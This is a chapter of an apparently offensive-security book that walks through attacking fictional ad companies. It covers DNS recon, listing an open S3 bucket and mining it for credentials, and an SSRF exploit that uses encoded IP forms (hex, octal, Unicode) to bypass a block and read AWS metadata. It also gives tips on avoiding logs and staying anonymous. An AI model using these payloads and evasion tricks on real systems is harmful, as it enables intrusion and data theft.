<html><head></head><body>
<section>
<header>
<h1 class="chapter">
<span class="ChapterNumber"><span epub:type="pagebreak" title="59" id="Page_59"/>5</span><br/>
<span class="ChapterTitle">Vulnerability Seeking</span></h1>
</header>
<figure class="opener">
<img src="image_fi/book_art/chapterart.png" alt=""/>
</figure>
<p class="ChapterIntro">We have around 150 domains to explore for various vulnerabilities: code injection, path traversal, faulty access controls, and so on. Hackers new to this type of exercise often feel overwhelmed by the sheer number of possibilities. Where to start? How much time should we spend on each website? Each page? What if we miss something?</p>
<p>This is probably the phase that will challenge your confidence the most. I will share as many shortcuts as possible in this book, but believe me when I say that for this particular task, the oldest recipe in the world is the most effective one: <em>the more you practice, the better you will get.</em> The more fantastic and incredible the vulnerabilities you encounter, the more confidence you will gain, not only in yourself, but also in the inevitability of human errors.</p>
<h2 id="h1-501263c05-0001"><span epub:type="pagebreak" title="60" id="Page_60"/>Practice Makes Perfect</h2>
<p class="BodyFirst">So how do you get started? Well, completing capture-the-flag (CTF) challenges is one way to master the very basic principles of exploits like SQL injections, cross-site scripting (XSS), and other web vulnerabilities. But be aware that these exercises poorly reflect the reality of a vulnerable application; they were designed by enthusiasts as amusing puzzles rather than the result of an honest mistake or a lazy copy-paste from a Stack Overflow post.</p>
<p>The best way to learn about exploits is to try them in a safe environment. For example, experiment with SQL injections by spinning up a web server and a database in your lab, writing an app, and experimenting with it. Discover the subtleties of different SQL parsers, write your own filters to prevent injections, try to bypass those same filters, and so on. Get into the mind of a developer, face the challenge of parsing unknown input to build a database query or persist information across devices and sessions, and you will quickly catch yourself making the same dangerous assumptions the developers fall prey to. And as the saying goes, behind every great vulnerability there lies a false assumption lurking to take credit. Any stack will do for experimentation purposes: Apache + PHP, Nginx + Django, NodeJS + Firebase, and so on. Learn how to use these frameworks, understand where they store settings and secrets, and determine how they encode or filter user input.</p>
<p>With time, you’ll develop a keen eye for spotting not only potentially vulnerable parameters, but how they are being manipulated by the application. Your mindset will change from “How can I make it work?” to “How can I abuse or break it?” Once this gear starts revolving in the back of your head, you will not be able to turn it off—trust me.</p>
<p>I also encourage you to take a look at what others are doing. I find great delight in reading bug bounty reports shared by researchers on Twitter, Medium, and other platforms like <em>https://pentester.land</em>. Not only will you be inspired by the tooling and methodology, but you will also be reassured, in some sense, that even the biggest corporations fail at the most basic features like password reset forms.</p>
<p>Thankfully, for our purposes we are not in penetration test engagement, so time will be the least of our concerns. It is in fact our most precious ally. We will spend as much time as we deem necessary on each website. Your flair and curiosity are all the permissions you need to spend the whole day toying with any given parameter.</p>
<h2 id="h1-501263c05-0002">Revealing Hidden Domains</h2>
<p class="BodyFirst">Back to our list of domains. When dealing with a full cloud environment, there is a shortcut that will help us learn more about websites and indeed prioritize them: we can reveal the real domains behind public-facing domains. Cloud providers usually produce unique URLs for each resource created by a customer, such as servers, load balancers, storage, managed databases, and content distribution endpoints. Take Akamai, a global content delivery network (CDN), for example. For a regular server, Akamai will <span epub:type="pagebreak" title="61" id="Page_61"/>create a domain name like <em>e9657.b.akamaiedge.net</em> to optimize packet transfer to that server. But no company will seriously use this unpronounceable domain for the public; they’ll hide it behind a glamorous name like <em>stellar.mxrads.com</em> or <em>victory.gretschpolitco.com</em>. The browser may think it is communicating with <em>victory.gretschpolitico.com</em>, but the network packet is actually being sent to the IP address of <em>e9657.b.akamaiedge.net</em>, which then forwards the packet to its final destination.</p>
<p>If we can somehow figure out these hidden cloud names concealed behind each of the websites we retrieved, we may deduce the cloud service the websites rely on and thus focus on those services more likely to exhibit misconfigurations: Akamai is nice, but AWS S3 (storage service) and API Gateway (managed proxy) are more interesting, as we shall soon see. Or, if we know that a website is behind an AWS Application Load Balancer, for example, we can anticipate some parameter filtering and therefore adjust our payloads. Even more interesting, we can try looking up the “origin” or real server IP address and thus bypass the intermediary cloud service altogether.</p>
<aside epub:type="sidebar">
<div class="top hr"><hr/></div>
<section class="note">
<h2><span class="NoteHead">NOTE</span></h2>
<p>	Finding the real IPs of services protected by Akamai, Cloudflare, CloudFront, and other distribution networks is not straightforward. Sometimes the IP leaks in error messages, sometimes in HTTP headers. Other times, if luck puffs your way and the server has a unique enough fingerprint, you can find it using Shodan, ZoomEye, or a custom tool like CloudBunny (<a href="https://github.com/Warflop/CloudBunny" class="LinkURL">https://github.com/Warflop/CloudBunny</a><a href="http:///" class="LinkURL">/</a>).</p>
<div class="bottom hr"><hr/></div>
</section>
</aside>
<p>Let’s go back to our list of domains and push our DNS recon an extra step to find these hidden domains. We want to look for <em>CNAME</em><em> entries</em> (name records that point to other name records) rather than IP addresses (as the more common A records do). The command <code>getent hosts</code> pulls these CNAME records:</p>
<pre><code>root@Point1:~/# <b>getent hosts thor.mxrads.com</b>
91.152.253.4    e9657.b.akamaiedge.net stellar.mxrads.com
stellar.mxrads.com.edgekey.net</code></pre>
<p>We can see that <em>thor.mxrads.com</em> is indeed behind an Akamai distribution point.</p>
<p>Not all alternative domains are registered as CNAME records; some are created as ALIAS records that do not explicitly show up in the name resolution process. For these stubborn cases, we can guess the AWS service by looking up the IP address in the public range published in the AWS documentation under General Reference.</p>
<p>I could not find a simple tool to perform this type of extended DNS reconnaissance, so I wrote a script to automate the process: <em>DNS Charts</em>, found at <a href="https://dnscharts.hacklikeapornstar.com/" class="LinkURL">https://dnscharts.hacklikeapornstar.com/</a>. We build a list of domains and then feed it to DNS Charts to look for those CNAME entries, with some additional regex matching to guess the cloud service. The result is printed in a colorful graph that highlights the underlying interactions between domains, as well as the main cloud services used by a company. <a href="#figure5-1" id="figureanchor5-1">Figure 5-1</a> shows some sample output of the tool.</p>
<span epub:type="pagebreak" title="62" id="Page_62"/><figure>
<img src="image_fi/501263c05/f05001.png" alt="f05001"/>
<figcaption><p><a id="figure5-1">Figure 5-1</a>: List of services used by MXR Ads</p></figcaption>
</figure>
<p>One glance at this graph gives us a pretty clear image of the most interesting endpoints to target first. The majority of domains we retrieved are hosted on AWS and use a mixture of the following services: <em>CloudFront</em>, a distribution network; <em>S3</em>, Amazon’s storage service; and <em>ELB</em>, a load balancer. The rest use the Akamai distribution network.</p>
<p>Notice how the dashboard URL of GP (top center) points to a domain belonging to MXR Ads (bottom left). We were right about their close relationship; it’s even reflected in their respective infrastructures.</p>
<p>We have a few leads here. For example, the <em>gretschpol-alb-1463804911.eu-west-1. . .</em> subdomain refers to an AWS Application Load Balancer (AWS ALB), suggested by the <em>alb</em> part of the URL. According to AWS documentation, this is a layer 7 load balancer that’s responsible for distributing incoming traffic. In theory, a layer 7 load balancer is capable of parsing HTTP requests and even blocking some payloads when linked to the AWS Web Application Firewall (AWS WAF). Whether that is indeed the case is open for speculation and will require active probing, of course.</p>
<aside epub:type="sidebar">
<div class="top hr"><hr/></div>
<section class="note">
<h2><span class="NoteHead">NOTE</span></h2>
<p>	It’s not like AWS WAF is the glorious WAF that everyone has been waiting for. Every now and then, a tweet pops out with a simple bypass: <a href="http://bit.ly/303dPm0" class="LinkURL">http://bit.ly/303dPm0</a>.</p>
<div class="bottom hr"><hr/></div>
</section>
</aside>
<p>The application load balancer can wait, however. We already picked up our list of winners the moment we laid eyes on the graph. We will start with the all-too-tempting AWS S3 URLs.</p>
<h2 id="h1-501263c05-0003">Investigating the S3 URLs</h2>
<p class="BodyFirst">AWS S3 is a highly redundant and cheap storage service offered by Amazon, starting at just $0.023 per GB, plus data transfer. Objects stored in S3 are organized into <em>buckets</em>. Each bucket has a unique name and URL across all AWS accounts (see <a href="#figure5-2" id="figureanchor5-2">Figure 5-2</a>).</p>
<span epub:type="pagebreak" title="63" id="Page_63"/><figure>
<img src="image_fi/501263c05/f05002.png" alt="f05002"/>
<figcaption><p><a id="figure5-2">Figure 5-2</a>: S3 storage bucket as it appears in the web console</p></figcaption>
</figure>
<p>S3 can host anything from JavaScript files to database backups. Following its rapid adoption by many companies, both small and massive, one could often hear in a meeting when speaking of a random file, “Oh, just put it on S3!”</p>
<p>This kind of concentration of easily available data on the internet draws hackers like bees to a flower, and sure enough, small and prestigious companies alike shared the same scandalous journal headlines. Open and vulnerable S3 buckets cost these companies terabytes of sensitive data, like customer information, transaction histories, and much more. Breaching a company has never been easier. You can even find a list of open S3 buckets at <a href="https://buckets.grayhatwarfare.com/" class="LinkURL">https://buckets.grayhatwarfare.com/</a>.</p>
<p>Our little DNS graph in <a href="#figure5-1">Figure 5-1</a> showed that we have four S3 URLs—dl.mxrads.com, misc.mxrads.com, assets.mxrads.com, and resource.mxrads.com—but in fact there may be more to uncover. Before we examine these buckets, we’ll weed these out. Sometimes Akamai and CloudFront can hide S3 buckets behind ALIAS records. To be thorough, we will loop over the 18 Akamai and CloudFront URLs and take a hard look at the <code>Server</code> directive in the HTTP response:</p>
<pre><code>root@Point1:~/# <b>while read p; do \</b>
<b>echo $p, $(curl --silent -I -i https://$p | grep AmazonS3) \</b>
<b>done &lt;cloudfront_akamai_subdomains.txt</b>

digital-js.mxrads.com, Server: AmazonS3
streaming.mxrads.com, Server: AmazonS3</code></pre>
<p>We have two more buckets to add to the mix. Great. We proceed to load our first bucket URL, dl.mxrads.com (an alias for mxrads-files.s3.eu-west-1.amazonaws.com), in the browser, hoping to gain entry to whatever the bucket stores. Unfortunately, we immediately get slapped with a rather explicit error:</p>
<figure class="graphic">
<img src="image_fi/501263c05/g05001.png" alt="g05001"/></figure>

<p><code>Access denied</code>.</p>
<p><span epub:type="pagebreak" title="64" id="Page_64"/>Contrary to what this message may suggest, we are not technically forbidden from accessing objects in the bucket. We are simply not allowed to list the bucket’s content, very much like how the <code>Options -Indexes</code> in an Apache server disables directory listing.</p>
<aside epub:type="sidebar">
<div class="top hr"><hr/></div>
<section class="note">
<h2><span class="NoteHead">NOTE</span></h2>
<p>	Sometimes the bucket is deleted but the CNAME remains defined. When that’s the case, we can attempt a subdomain takeover by creating a bucket with the same name in our own AWS account. It’s an interesting technique that can prove fatal in some situations. There is a nice article by Patrik Hudak about this at <a href="https://0xpatrik.com/takeover-proofs/" class="LinkURL">https://0xpatrik.com/takeover-proofs/</a>.</p>
<div class="bottom hr"><hr/></div>
</section>
</aside>
<h3 id="h2-501263c05-0001">S3 Bucket Security</h3>
<p class="BodyFirst">Following one too many scandals involving insecure S3 buckets, AWS has tightened up its default access controls. Each bucket now has a sort of public switch that the user can easily activate to disallow any type of public access. It might seem like a basic feature to have, except that a bucket’s access list is governed by not one, not two, not three, but four overlapping settings beneath the public switch! How very convoluted. One can almost forgive companies for messing up their configuration. These settings are as follows:</p>
<ol class="none">
<li><span class="RunInHead">Access control lists (ACLs)</span>  Explicit rules stating which AWS accounts can access which resources (deprecated).</li>
<li><span class="RunInHead">Cross-Origin Resource Sharing (CORS)</span>  Rules and constraints placed on HTTP requests originating from other domains, which can filter based on the request’s user agent string, HTTP method, IP address, resource name, and so on.</li>
<li><span class="RunInHead">Bucket policy</span>  A JavaScript Object Notation (JSON) document with rules stating which actions are allowed, by whom, and under which conditions. The bucket policy replaces ACLs as the nominal way of protecting a bucket.</li>
<li><span class="RunInHead">Identity and Access Management (IAM</span>) policies  Similar to bucket policies, but these JSON documents are attached to users/groups/roles instead of buckets.</li>
</ol>
<p>Here’s an example of a bucket policy that allows anyone to get an object from the bucket but disallows any other operation on the bucket, such as listing its contents, writing files, changing its policy, and so on:</p>
<pre><code>{
  "Version":"2012-10-17",
  "Statement":[
    {
      "Sid":"UniqueID", // ID of the policy
      "Effect":"Allow", // Grant access if conditions are met
      "Principal": "*", // Applies to anyone (anonymous or not)
      "Action":["s3:GetObject"], // S3 operation to view a file
<span epub:type="pagebreak" title="65" id="Page_65"/>      "Resource":["arn:aws:s3:::bucketname/*"] // All files in the bucket
    }
  ]
}</code></pre>
<p>AWS combines rules from these four settings to decide whether or not to accept an incoming operation. Presiding over these four settings is the master switch, called <em>Block public access</em>, which when turned on disables all public access, even if it’s explicitly authorized by one of the four underlying settings.</p>
<p>Complicated? That’s putting it mildly. I encourage you to set up an AWS account and explore the intricacies of S3 buckets to develop the right reflexes in recognizing and abusing overly permissive S3 settings.</p>
<aside epub:type="sidebar">
<div class="top hr"><hr/></div>
<section class="note">
<h2><span class="NoteHead">NOTE</span></h2>
<p>	There is also the rather illusive notion of object ownership, which trumps all other settings except for the public switch. We will deal with it later on.</p>
<div class="bottom hr"><hr/></div>
</section>
</aside>
<h3 id="h2-501263c05-0002">Examining the Buckets</h3>
<p class="BodyFirst">Back to our list of buckets. We skim through them and are again denied entry for all except <em>misc.mxrads.com</em>, which, strangely enough, returns an empty page. The absence of error is certainly encouraging. Let’s probe further using the AWS command line. First, we install the AWS command line interface (CLI):</p>
<pre><code>root@Point1:~/# <b>sudo apt install awscli</b>
root@Point1:~/# <b>aws configure</b>
# Enter any valid set of credentials to unlock the CLI.
# You can use your own AWS account, for instance.</code></pre>
<p>The AWS CLI does not accept S3 URLs, so we need to figure out the real bucket name behind <em>misc.mxrads.com</em>. Most of the time, this is as simple as inspecting the domain’s CNAME record, which in this case yields mxrads-misc.s3-website.eu-west-1.amazonaws.com. This tells us that the bucket’s name is mxrads-misc. If inspecting the CNAME doesn’t work, we need more elaborate tricks, such as injecting special characters like <code>%C0</code> in the URL, or appending invalid parameters, in an attempt to get S3 to display an error page containing the bucket name.</p>
<p>Armed with this bucket name, we can leverage the full power of the AWS CLI. Let’s start by retrieving a full list of objects present in the bucket and saving it to a text file:</p>
<pre><code>root@Point1:~/# <b>aws s3api list-objects-v2 --bucket mxrads-misc &gt; list_objects.txt</b>
root@Point1:~/# <b>head list_objects.txt</b>
{ "Contents": [{
     "Key": "Archive/",
     "LastModified": "2015-04-08T22:01:48.000Z",
      "Size": 0,

<span epub:type="pagebreak" title="66" id="Page_66"/>     "Key": "Archive/_old",
     "LastModified": "2015-04-08T22:01:48.000Z",
     "Size": 2969,

     "Key": "index.html",
     "LastModified": "2015-04-08T22:01:49.000Z",
     "Size": 0,
    },
<var>--snip--</var></code></pre>
<p>We get a lot of objects—too many to manually inspect. To find out exactly how many, we grep the <code>"Key"</code> parameters:</p>
<pre><code>root@Point1:~/# <b>grep '"Key"' list_objects.txt |wc -l</b>
425927</code></pre>
<p>Bingo! We have more than 400,000 files stored in this single bucket. That’s as good a catch as they come. In the list of objects, note the empty <em>index.html</em> at the root of the S3 bucket; an S3 bucket can be set up to act as a website hosting static files like JavaScript code, images, and HTML, and this <em>index.html</em> file is what’s responsible for the blank page we got earlier when running the URL.</p>
<aside epub:type="sidebar">
<div class="top hr"><hr/></div>
<section class="box">
<h2>S3 Filing system</h2>
<p class="BoxBodyFirst">Also notice how S3’s internal catalog system lacks any hierarchical order. It’s a common misconception to think of S3 as a filesystem. It’s not. There are no folders, or indeed files—at least not in their common modern definitions. S3 is a key-value storage system. Period. AWS’s web console gives the illusion of organizing files inside folders, but that’s just some GUI voodoo. A folder in S3 is simply a key pointing to a null value. A file that seems to be inside a folder is nothing more than a blob of storage referenced by a key named like <em>/folder/file</em>. As another way to put it, using the AWS CLI, we can delete a folder without deleting that folder’s files because the two are absolutely not related.</p>
<div class="bottom hr"><hr/></div>
</section>
</aside>
<p>It’s time for some poor man’s data mining. Let’s use regex patterns to look up SQL scripts, bash files, backup archives, JavaScript files, config files, VirtualBox snapshots—anything that might give us valuable credentials:</p>
<pre><code># We extract the filenames in the "Key" parameters:
root@Point1:~/# <b>grep '"Key"' list_objects | sed 's/[",]//g' &gt; list_keys.txt</b>

root@Point1:~/# <b>patterns='\.sh$|\.sql$|\.tar\.gz$\.properties$|\.config$|\.tgz$'</b>

root@Point1:~/# <b>egrep $patterns list_keys.txt</b>
  Key: debug/360-ios-safari/deploy.sh
<span epub:type="pagebreak" title="67" id="Page_67"/>  Key: debug/ias-vpaidjs-ios/deploy.sh
  Key: debug/vpaid-admetrics/deploy.sh
  Key: latam/demo/SiempreMujer/nbpro/private/private.properties
  Key: latam/demo/SiempreMujer/nbpro/project.properties
  Key: demo/indesign-immersion/deploy-cdn.sh
  Key: demo/indesign-immersion/deploy.sh
  Key: demo/indesign-mobile-360/deploy.sh
<var>--snip--</var></code></pre>
<p>This gives us a list of files with some potential. We then download these candidates using <code>aws s3api get-object</code> and methodically go through each of them, hoping to land on some form of valid credentials. An interesting fact to keep in mind is that AWS does not log S3 object operations like <code>get-object</code> and <code>put-object</code> by default, so we can download files to our heart’s content with the knowledge that no one has tracked our movements. Sadly, that much cannot be said of the rest of the AWS APIs.</p>
<p>Hours of research later and we still have nothing, zip, nada. It seems most of the scripts are old three-liners used to download public documents, fetch other scripts, automate routine commands, or create dummy SQL tables.</p>
<p>Time to try something else. Maybe there are files with sensitive data that escaped our previous pattern filter. Maybe files with uncommon extensions hiding in the pile. To find these files, we run an aggressive inverted search that weeds out common and useless files like images, Cascading Style Sheets (CSS), and fonts in an effort to reveal some hidden gems:</p>
<pre><code>root@Point1:~/# <b>egrep -v\</b>
<b>"\.jpg|\.png|\.js|\.woff|/\",$|\.css|\.gif|\.svg|\.ttf|\.eot" list_keys.xt</b>

Key: demo/forbes/ios/7817/index.html
Key: demo/forbes/ios/7817/index_1.html
Key: demo/forbes/ios/7817/index_10.html
Key: demo/forbes/ios/7817/index_11.html
Key: demo/forbes/ios/7817/index_12.html
Key: demo/forbes/ios/7817/index_13.html
--<var>snip</var>--

root@Point1:~/# <b>aws s3api get-object --bucket mxrads-misc \</b>
<b>--key demo/forbes/ios/7817/index.html forbes_index.html</b></code></pre>
<p>HTML files are not exactly the special files we had in mind, but since they represent more than 75 percent of the files in this bucket, we’d better take a look. Opening them up, we see that they appear to be saved pages from news websites around the world. Somewhere in this messy GP infrastructure, an application is fetching web pages and storing them in this bucket. We want to know why.</p>
<p>Remember in the Introduction when I spoke about that special <em>hacker flair</em>? This is it. This is the kind of find that should send tingling sensations down your spine!</p>
<h3 id="h2-501263c05-0003"><span epub:type="pagebreak" title="68" id="Page_68"/>Inspecting the Web-Facing Application</h3>
<p class="BodyFirst">Where is this damn application hiding? To weed it out, we go back to our DNS reconnaissance results from <a href="#figure5-1">Figure 5-1</a> and, sure enough, the perfect suspect jumps out screaming from the lot: <em>demo.mxrads.com</em>. We saw the same “demo” keyword in the S3 keys with HTML files. We didn’t even have to grep.</p>
<p>We enter <em>demo.mxrads.com</em> in the browser and see that the main image and headline seem to describe the behavior we were looking for (see <a href="#figure5-3" id="figureanchor5-3">Figure 5-3</a>).</p>
<figure>
<img src="image_fi/501263c05/f05003.png" alt="f05003"/>
<figcaption><p><a id="figure5-3">Figure 5-3</a>: Home page of demo.mxrads.com</p></figcaption>
</figure>
<p>To take a closer look at this page, we’ll fire up Burp Suite, a local web proxy that conveniently intercepts and relays every HTTP request coming from our browser (OWASP fans can use ZAP, the Zed Attack Proxy). We reload <em>demo.mxrads.com</em> with Burp running and see the requests made by the site trickling down in real time, as shown in <a href="#figure5-4" id="figureanchor5-4">Figure 5-4</a>.</p>
<figure>
<img src="image_fi/501263c05/f05004.png" alt="f05004"/>
<figcaption><p><a id="figure5-4">Figure 5-4</a>: Burp inspection of the MXR Ads demo page</p></figcaption>
</figure>
<aside epub:type="sidebar">
<div class="top hr"><hr/></div>
<section class="note">
<h2><span class="NoteHead">NOTE</span></h2>
<p>	For an extra layer of anonymity, we can instruct either Burp or ZAP to direct its traffic through a SOCKS proxy sitting on the attack server to make sure all packets originate from that distant host. Look for SOCKS proxy under Options in Burp.</p>
<div class="bottom hr"><hr/></div>
</section>
</aside>
<p>This is a great attack surface. Using Burp, we can intercept these HTTP(S) requests, alter them on the fly, repeat them at will, and even configure regex rules to automatically match and replace headers. If you’ve ever done a web pentest or CTF challenge, you must have used a similar tool. But we’ll set that aside for now and continue our investigation.</p>
<p>We return to inspecting the <em>demo.mxrads.com </em>site. As we would suspect from a company like MXR Ads, this website offers to showcase demo ads on multiple browsers and devices, and also on some featured websites like <em/><span epub:type="pagebreak" title="69" id="Page_69"/>nytimes.com and <em>theregister.com </em>(see <a href="#figure5-5" id="figureanchor5-5">Figure 5-5</a>). Sales teams around the world likely leverage these features to convince media partners that their technology seamlessly integrates with any web framework. Pretty clever.</p>
<figure>
<img src="image_fi/501263c05/f05005.png" alt="f05005"/>
<figcaption><p><a id="figure5-5">Figure 5-5</a>: MXR Ads feature showcasing ads on various popular sites</p></figcaption>
</figure>
<p>We’ll inspect the page by trying out the feature. We choose to display an ad on the <em>New York Times</em> website, and a new content window pops up with a lovely ad for a random perfume brand stacked in the middle of today’s NYT’s main page.</p>
<p>This demo page may seem like a harmless feature: we point to a website, and the app fetches its actual content and adds a video player with a random ad to show potential clients what MXR Ads can do. What vulnerabilities could it possibly introduce? So many . . .</p>
<p>Before we look at how to exploit this app, let’s first assess what’s happening behind the scenes using Burp Proxy. What happens when we click the NYT option to showcase an ad? We see the results in <a href="#figure5-6" id="figureanchor5-6">Figure 5-6</a>.</p>
<figure>
<img src="image_fi/501263c05/f05006.png" alt="f05006"/>
<figcaption><p><a id="figure5-6">Figure 5-6</a>: The HTTP History tab after we click the NYT option on <em>demo.mxrads.com</em></p></figcaption>
</figure>
<p>We don’t get much HTTP traffic, that’s for sure. Once the web page is loaded, the server responds with an “HTTP/1.1 101 Switching Protocols” message, then no more communication appears in the HTTP History tab. We need to switch to the WebSockets History tab to follow the rest of the exchange.</p>
<h3 id="h2-501263c05-0004">Interception with WebSocket</h3>
<p class="BodyFirst"><em>WebSocket</em> is another communication protocol alongside HTTP, but unlike HTTP WebSocket is a full-duplex communication channel. In the regular HTTP protocol, each server response matches a client request. The server does not maintain state between two requests; rather, the state <span epub:type="pagebreak" title="70" id="Page_70"/>is handled by cookies and headers, which help the backend application remember who is calling which resource. WebSockets operate differently: the client and server establish a full-duplex and binding tunnel where each one can initiate communications at will. It is not uncommon to have several incoming messages for one outgoing message, or vice versa. (For more on WebSockets, check out <a href="https://blog.teamtreehouse.com/an-introduction-to-websockets/" class="LinkURL">https://blog.teamtreehouse.com/an-introduction-to-websockets/</a>.) The beautiful aspect of WebSockets is that they do not require HTTP cookies and therefore don’t bother supporting them. These are the same cookies that maintain the user authentication session! So whenever there is a switch from HTTP to WebSocket in authenticated sessions, there is an opportunity to bypass access control by directly fetching sensitive resources using WebSocket instead of HTTP—but that’s another class of vulnerability for another time. <a href="#figure5-7" id="figureanchor5-7">Figure 5-7</a> shows our WebSockets History tab.</p>
<figure>
<img src="image_fi/501263c05/f05007.png" alt="f05007"/>
<figcaption><p><a id="figure5-7">Figure 5-7</a>: The WebSockets History tab for <em>demo.mxrads.com</em></p></figcaption>
</figure>
<p>The WebSocket communication seems pretty straightforward: each message to the server is composed of a URL (<em>nytimes.com</em>) followed by metrics related to the user’s browser (Mozilla/5.0. . .), along with an identifier of the ad to display (437). Burp cannot replay (<em>repeat</em> in Burp terminology) past WebSocket communications, so to tamper with the WebSocket message we need to manually trigger it from the demo website.</p>
<p>We turn on intercept mode in the Burp options, which will allow us to catch the next message exchanged and update it on the fly (see <a href="#figure5-8" id="figureanchor5-8">Figure 5-8</a>). For instance, let’s see if we can get the MRX Ads site to fetch the home page of that Nginx container we set up in Chapter 3.</p>
<figure>
<img src="image_fi/501263c05/f05008.png" alt="f05008"/>
<figcaption><p><a id="figure5-8">Figure 5-8</a>: Intercepting a web page in Burp</p></figcaption>
</figure>
<p>We forward the modified request and head to our Docker container to explore the logs. We grab the container ID using <code>docker ps</code> and then feed it to <code>docker logs</code>:</p>
<pre><code>root@Nginx:~/# <b>docker ps</b>
CONTAINER ID        IMAGE                COMMAND
5923186ffda5        sparcflow/ngi...   "/bin/bash /sc..."

<span epub:type="pagebreak" title="71" id="Page_71"/>root@Nginx:~/# <b>docker logs 5923186ffda5</b>
54.221.12.35 - - [26/Oct/2020:13:44:08 +0000] "GET / HTTP/1.1"...</code></pre>
<p>The MXR Ads app does indeed fetch URLs in real time! Why is that so awesome, you ask? Well, not all domains and IP addresses were created equal, you see. Some IP addresses have particular purposes. A perfect example is the 127.0.0.0/8 block that refers to the loopback address (the host itself), or 192.168.0.0/16, which is reserved for private networks. One lesser-known IP address range is 169.254.0.0/16, which is reserved by the Internet Engineering Task Force (IETF) for link-local addressing, meaning this range is only valid for communication inside a network and cannot be routed to the internet. Whenever a computer fails to acquire an IP address through DHCP, for instance, it assigns itself an IP in this range. More importantly, this range is also used by many cloud providers to expose private APIs to their virtual machines, so they become aware of their own environment.</p>
<p>On almost all cloud providers, a call to the IP 169.254.169.254 is routed to the hypervisor and retrieves information about internal matters such as the machine’s hostname, internal IP, firewall rules, and so forth. This is a trove of metadata that could give us a sneak peek into the company’s internal architecture.</p>
<p>Let’s give it a go, shall we? With Burp intercept mode still on, we trigger another WebSocket message to showcase an ad on the <em>New York Times</em>, but this time we replace the URL in the message body with the default AWS metadata URL, <em>http://169.254.169.254/latest</em>, as shown next:</p>
<pre><code># Modified WebSocket message:
http://169.254.169.254:! Mozilla/5.0 (Windows NT 9.0; Win64; x64...</code></pre>
<p>We wait for a response from the server—remember it’s asynchronous—but nothing comes back.</p>
<p>MXR Ads is not making things easy for us. It’s reasonable to assume that the URL is explicitly banned in the app for precisely this reason. Or maybe the app simply expects a valid domain? Let’s replace the metadata IP with a more innocuous IP (for instance, that of our Nginx container):</p>
<pre><code># Modified WebSocket message:
http://54.14.153.41/:! Mozilla/5.0 (Windows NT 9.0; Win64; x64...</code></pre>
<p>We check the logs and, sure enough, we see the request from the app coming through:</p>
<pre><code>root@Point1:~/# <b>docker logs 5923186ffda5</b>
54.221.12.35 - - [26/Oct/2020:13:53:12 +0000] "GET / HTTP/1.1"...</code></pre>
<p>Okay, so some IP addresses are allowed, but 169.254.169.254 must be explicitly banned by the app. Time to whip out our bag of dirty string-parsing tricks. Though IP addresses are commonly expressed in decimal <span epub:type="pagebreak" title="72" id="Page_72"/>format, browsers and web clients are in fact happy with more esoteric representations, like hexadecimal or octal. For instance, all the following IP addresses are equivalent:</p>
<pre><code>http://169.254.169.254
http://0xa9fea9fe # hexadecimal representation
http://0xA9.0xFE.0xA9.0xFE # dotted hexadecimal
http://025177524776 # octal representation
http://①⑥⑨.②⑤④.①⑥⑨.②⑤④ # Unicode representation</code></pre>
<p>We can try to get around the IP address ban by trying out its hex, dotted hex, and octal alternatives.</p>
<aside epub:type="sidebar">
<div class="top hr"><hr/></div>
<section class="box">
<h2>Assigning Private IP Addresses to Public Domains</h2>
<p class="BoxBodyFirst">One alternative technique is to register a custom domain name that resolves to 169.254.169.254 and then use that domain name to try to bypass the hardcoded check. After all, nothing forbids us from assigning a private IP address to a public domain. The IP address will be dropped by the first public router, but since the request does not leave the physical network card, the trick works like a charm.</p>
<div class="bottom hr"><hr/></div>
</section>
</aside>
<p>In this case, simple hexadecimal formatting does the job, and we get the famous output of AWS’s metadata API, as shown in <a href="#figure5-9" id="figureanchor5-9">Figure 5-9</a>.</p>
<figure>
<img src="image_fi/501263c05/f05009.png" alt="f05009"/>
<figcaption><p><a id="figure5-9">Figure 5-9</a>: Output of the AWS metadata URL</p></figcaption>
</figure>
<p>In the Raw section at the bottom of <a href="#figure5-9">Figure 5-9</a>, the strings 1.0, 2007-01-19, 2007-03-01, and so on are the different versions of the metadata endpoint. Rather than specify a specific date, we can use the keyword <em>/latest</em> in the path to get the most data possible, as we’ll see in the next section.</p>
<p>This output, of course, confirms that we have a valid case for server-side request forgery. Time for some damage!</p>
<h2 id="h1-501263c05-0004"><span epub:type="pagebreak" title="73" id="Page_73"/>Server-Side Request Forgery</h2>
<p class="BodyFirst">A <em>server-side request forgery (SSRF</em><em>)</em> attack involves us forcing some server-side application to make HTTP requests to a domain of our choosing. This can sometimes grant us access to internal resources or unprotected admin panels.</p>
<h3 id="h2-501263c05-0005">Exploring the Metadata</h3>
<p class="BodyFirst">We start gathering basic information about the machine running this web page–fetching application, again using Burp’s intercept mode. After intercepting our request, we substitute the hex-encoded metadata IP for the originally requested URL and then append AWS’s metadata API name to the end, as shown in <a href="#listing5-1" id="listinganchor5-1">Listing 5-1</a>.</p>
<aside epub:type="sidebar">
<div class="top hr"><hr/></div>
<section class="note">
<h2><span class="NoteHead">NOTE</span></h2>
<p>	Spin up a regular machine on AWS and start exploring the metadata API to get a better grasp of the information available. You can find a list of all available fields at <a href="https://amzn.to/2FFwvPn" class="LinkURL">https://amzn.to/2FFwvPn</a>.</p>
<div class="bottom hr"><hr/></div>
</section>
</aside>
<pre><code># AWS Region
http://0xa9fea9fe/latest/meta-data/placement/availability-zone
eu-west-1a

# Instance ID
http://0xa9fea9fe/latest/meta-data/instance-id
<span class="CodeAnnotationHang" aria-label="annotation1">1</span> i-088c8e93dd5703ccc

# AMI ID
http://0xa9fea9fe/latest/meta-data/ami-id
<span class="CodeAnnotationHang" aria-label="annotation2">2</span> ami-02df9ea15c1778c9c

# Public hostname
http://0xa9fea9fe/latest/meta-data/public-hostname
<span class="CodeAnnotationHang" aria-label="annotation3">3</span> ec2-3-248-221-147.eu-west-1.compute.amazonaws.com</code></pre>
<p class="CodeListingCaption"><a id="listing5-1">Listing 5-1</a>: Basic information on the web app, pulled from the metadata API</p>
<p>From this we see that the demo app is running in the <code>eu-west-1</code> region, indicating one of Amazon’s datacenters in Ireland. There are dozens of regions available in AWS. While companies strive to distribute their most important applications across multiple regions, auxiliary services and sometimes backends tend to concentrate in a subset of regions. The instance ID, a unique identifier assigned to each virtual machine spawned in the EC2 service, is <code>i-088c8e93dd5703ccc</code> <span class="CodeAnnotation" aria-label="annotation1">1</span>. This information can come in handy when executing AWS API calls targeting the machine running the ad application.</p>
